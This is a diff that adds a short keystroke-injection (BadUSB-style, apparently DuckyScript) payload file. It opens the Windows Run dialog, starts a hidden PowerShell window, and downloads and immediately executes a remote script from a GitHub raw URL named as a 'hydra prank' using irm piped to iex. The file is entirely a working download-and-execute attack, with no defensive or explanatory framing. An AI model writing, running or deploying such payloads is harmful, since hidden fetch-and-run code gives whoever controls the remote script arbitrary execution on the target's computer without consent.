@@ -1,0 +1,4 @@
+GUI r
+DELAY 750
+STRING powershell -w h -C [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; irm https://raw.githubusercontent.com/mbeskek/flips/main/hydra%20prank.ps1 | iex
+ENTER
